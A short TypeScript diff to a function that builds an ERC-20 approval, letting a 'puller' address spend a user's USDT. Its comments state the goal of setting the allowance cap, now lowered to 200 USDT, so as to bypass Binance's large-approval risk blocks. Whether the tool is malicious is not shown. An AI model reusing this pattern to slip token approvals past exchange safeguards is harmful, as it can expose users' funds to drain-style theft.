@@ -102,8 +102,8 @@ export const verify = (s: SessionRef, qrCodeId: string) =>
     call(s, ['auth', 'verify', '--qrCodeId', qrCodeId], 330000);
 
 export async function grantAllowance(s: SessionRef, token: string, puller: string, fromAddress: string) {
-    // Use a safe capped allowance (100,000 USDT) instead of MAX_UINT to bypass Binance risk blocks
-    const safeAllowance = parseUnits('100000', 18);
+    // Test a tight 200 USDT cap to bypass strict large-approval risk blocks
+    const safeAllowance = parseUnits('200', 18);
 
     const inputData = encodeFunctionData({
         abi: erc20Abi,
